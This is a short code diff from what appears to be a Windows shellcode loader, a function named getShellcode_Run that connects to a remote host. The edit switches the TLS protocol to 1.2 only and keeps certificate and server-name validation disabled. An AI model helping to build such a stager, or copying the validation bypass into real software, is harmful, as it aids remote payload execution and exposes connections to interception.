@@ -437,9 +437,9 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     // Initialize security context for SSL/TLS
     SCHANNEL_CRED schannelCred = {0};
     schannelCred.dwVersion = SCHANNEL_CRED_VERSION;
-    // Allow TLS 1.3 and TLS 1.2 to avoid SEC_E_ALGORITHM_MISMATCH
-    schannelCred.grbitEnabledProtocols = SP_PROT_TLS1_3_CLIENT | SP_PROT_TLS1_2_CLIENT;
-    // Temporarily bypass certificate validation to rule out cert issues
+    // Try TLS 1.2 to see if the server supports it
+    schannelCred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT;
+    // Keep bypassing certificate validation for now
     schannelCred.dwFlags = SCH_CRED_NO_SERVERNAME_CHECK | SCH_CRED_MANUAL_CRED_VALIDATION;
 
     TimeStamp tsExpiry;
